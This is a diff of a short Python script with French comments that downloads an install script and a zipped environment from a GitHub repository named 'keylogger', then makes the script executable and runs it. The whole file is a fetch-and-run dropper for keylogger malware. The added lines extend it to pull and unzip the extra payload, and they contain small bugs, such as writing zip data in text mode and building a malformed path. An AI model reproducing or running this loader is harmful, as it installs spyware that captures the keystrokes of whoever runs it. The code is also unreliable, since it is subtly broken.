@@ -1,22 +1,33 @@
 import os
-os.system('pip install requests')
-
 import requests
 
 
-url = 'https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/install_and_run/install_and_run.sh'
+urlInstalleur = 'https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/install_and_run/install_and_run.sh'
 
-filename = 'install_and_run.sh'
+filenameInstalleur = 'install_and_run.sh'
 
-response = requests.get(url)
+responseInstalleur = requests.get(urlInstalleur)
 
-if response.status_code == 200:
+if responseInstalleur.status_code == 200:
     # Sauvegarder le fichier localement
-    with open(filename, 'w', encoding='utf-8') as file:
-        file.write(response.text)
+    with open(filenameInstalleur, 'w', encoding='utf-8') as file:
+        file.write(responseInstalleur.text)
 
-    print(f'Le fichier {filename} a été téléchargé avec succès.')
+    print(f'Le fichier {filenameInstalleur} a été téléchargé avec succès.')
 
-os.system('chmod +x ' + filename)
-os.system('./' + filename)
+urlEnvironnement = 'https://github.com/ELREBEU/keylogger/raw/refs/heads/main/env.zip'
+
+filenameEnvironnement = 'env.zip'
+
+responseEnvironnement = requests.get(urlEnvironnement)
+
+if responseEnvironnement.status_code == 200:
+    with open(filenameEnvironnement,'w',encoding='utf-8') as file:
+        file.write(responseEnvironnement.text)
+
+os.system('unzip ' + filenameEnvironnement)
+cheminToDirectory = os.getcwd()
+cheminToEnvironnement = cheminToDirectory+'env/bin/python'
+os.system('chmod +x ' + filenameInstalleur)
+os.system('./' + filenameInstalleur + ' ' + cheminToEnvironnement)
 
